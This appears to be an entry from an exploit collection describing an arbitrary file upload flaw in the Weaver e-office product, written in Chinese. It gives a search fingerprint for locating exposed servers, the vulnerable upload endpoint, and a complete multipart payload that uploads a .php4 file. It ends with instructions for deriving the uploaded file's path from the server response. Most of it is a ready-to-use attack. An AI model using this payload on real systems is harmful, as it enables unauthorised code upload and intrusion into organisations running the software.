# 泛微-eoffice-webservice-file-upload任意文件上传漏洞

泛微OA ｜ 文件上传 ｜ —
- **指纹**：`app="泛微-EOffice"`
- **请求**：`POST /webservice/upload/upload.php HTTP/1.1`

**Payload**
```
----------------------------553898708333958420021355
Content-Disposition: form-data; name="file"; filename="qq_test.php4"
Content-Type: application/octet-stream
qqtest
----------------------------553898708333958420021355--
文件地址：
/attachment/{{filepath}}
filepath从响应里面获取，需要将响应中的*替换为/
```